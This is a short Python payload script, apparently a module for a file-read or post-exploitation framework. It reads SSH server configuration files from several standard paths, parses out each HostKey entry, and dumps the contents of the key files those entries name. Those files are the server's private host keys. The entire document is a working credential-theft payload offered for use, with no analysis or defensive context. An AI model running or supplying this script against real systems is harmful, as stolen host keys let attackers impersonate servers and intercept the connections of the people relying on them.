#REQUIRE_LINUX
#This payload shows SSH Server configuration files
import re

result = []
files = []

def parse_hostkey(config):
    hostkey = re.findall('(?<=HostKey )(.*)', config, re.MULTILINE)
    if hostkey:
        return hostkey
    else:
        return ''

files.append('/etc/ssh/sshd_config')
files.append('/etc/rssh.conf')
files.append('/usr/local/etc/sshd_config')
files.append('/etc/sshd_config')
files.append('/etc/openssh/sshd_config')


for file in files:
    hostkey = parse_hostkey(read(file))
    for key in hostkey:
        files.append(key)

for file in files:
    if read(file) != '':
        result.append('-------------------------')
        result.append('FILE => '+file)
        result.append(read(file))

result = [p for p in result if p != '']
